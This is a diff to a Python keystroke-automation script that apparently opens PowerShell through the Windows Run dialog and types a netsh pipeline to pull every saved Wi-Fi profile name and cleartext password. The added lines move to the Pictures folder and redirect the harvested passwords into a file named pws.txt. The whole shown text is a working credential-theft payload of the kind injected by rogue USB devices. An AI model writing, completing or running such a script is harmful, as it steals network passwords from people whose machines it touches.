@@ -7,15 +7,24 @@ get_usernam = getuser()
 get_current_dir = getcwd()
 
 # Open Run command
-press_and_release("windows")
+press_and_release("win")
 sleep(0.5)
 
 write("pw")
 sleep(0.2)
 
 press_and_release("enter")
-sleep(0.10)
-sleep(0.7)
+sleep(1)
+
+write("cd Pictures")
+press_and_release("enter")
+sleep(0.5)
+
+write("echo > pws.txt")
+sleep(0.5)
+press_and_release("enter")
+press_and_release("enter")
+sleep(0.5)
 
 write("""netsh wlan show profile | 
     Select-String '(?<=All User Profile\\s+:\\s).+' | 
@@ -28,11 +37,13 @@ write("""netsh wlan show profile |
             Name     = $wlan
             Password = $passw.Matches.Value
         }
-    }""")
-sleep(0.5)
+    } > pws.txt""")
+sleep(1)
 
 press_and_release("enter")
 sleep(0.7)
 
 press_and_release("win+up")
 sleep(0.5)
+
+# Here I want to save the output into pws.txt
